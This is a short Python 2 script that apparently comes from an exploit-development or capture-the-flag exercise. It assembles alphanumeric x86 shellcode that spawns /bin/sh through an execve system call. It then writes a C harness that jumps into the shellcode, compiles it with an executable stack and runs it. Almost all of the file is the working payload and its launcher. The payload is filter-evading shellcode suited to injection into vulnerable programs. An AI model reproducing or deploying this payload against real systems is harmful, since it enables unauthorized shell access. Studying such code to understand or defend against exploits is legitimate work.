import os

shellcode = ""
# set ebx "//bin/sh" pointer
shellcode += "j0X40" # eax = 0
shellcode += "P" # push eax
shellcode += "5ZZCX"+"54u00"+"P" # push "n/sh"
shellcode += "j0X40" # eax = 0
shellcode += "5ZZZZ"+"5uu83"+"P" # push "//bin"
shellcode += "T" # push esp
shellcode += "[" # pop ebx

# set eax = 11 edx,ecx = 0
shellcode += "j0X40" # eax = 0
shellcode += "PZ" # edx = 0
shellcode += "PY" # ecx = 0
shellcode += "A"*11 # ecx = 11
shellcode += "QX" # eax = 11
shellcode += "RY" # ecx = 0

# int 80
shellcode += "\xcd\x80" # ecx = 0

code = "#include<string.h>\n"
code += "int main(void)\n{\n"
code += "char shellcode[4096];\n"
code += "strcpy(shellcode,\"" + shellcode + "\");\n"
code += "(*(void(*)()) shellcode)();\n"
code += "return 0;\n}"

print shellcode
file = open('input.c', 'w')
file.write(code)
file.close()
os.system("gcc input.c -z execstack && ./a.out")
